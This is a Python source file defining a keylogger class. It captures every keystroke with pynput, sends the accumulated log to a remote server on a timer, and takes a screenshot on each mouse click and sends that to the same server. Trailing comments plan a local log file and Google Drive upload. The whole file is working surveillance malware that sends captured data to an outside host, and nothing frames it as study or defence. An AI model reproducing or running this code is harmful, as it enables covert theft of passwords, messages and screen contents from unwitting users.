import pynput
import threading
import pyautogui
import client


class Keylogger:

    def __init__(self, serverIp, serverPort, timeIntervalReport):
        self.log="Keylogger Started"
        self.client = client.Client(serverIp, serverPort)
        self.timeIntervalReport = timeIntervalReport

    def reportServerLog(self):
        self.client.sendMessage({
            "data": self.log
        }, 'utf-8', 'text/json')
        self.log = ""
        timer = threading.Timer(self.timeIntervalReport, self.reportServerLog)
        timer.start()

    def start(self):
        self.reportServerLog()
        keyboardListener = pynput.keyboard.Listener(on_press=self.eventKeyPress)
        keyboardListener.start()
        mouseListener = pynput.mouse.Listener(on_click=self.eventClickMouse)
        mouseListener.start()

    def eventKeyPress(self, key):
        self.log+=self.formatKeyPressed(key)

    def formatKeyPressed(self, key):
        try:
            currentKey = key.char
        except:
            translateKey = {
                key.space: " ",
                key.enter: "\n"
            }
            currentKey = translateKey.get(key, " (/* " + str(key) + " */) ")
        return currentKey

    def eventClickMouse(self, a, b, c, d):
        screenshot = pyautogui.screenshot()
        self.client.sendMessage(screenshot, None, "image")
        print("Screenshot Succesfull")

#screenshot in click event and date send of packets (2 threads)
#aprimorar tratamento de erro
#generate log file, with the obtained content
#google drive
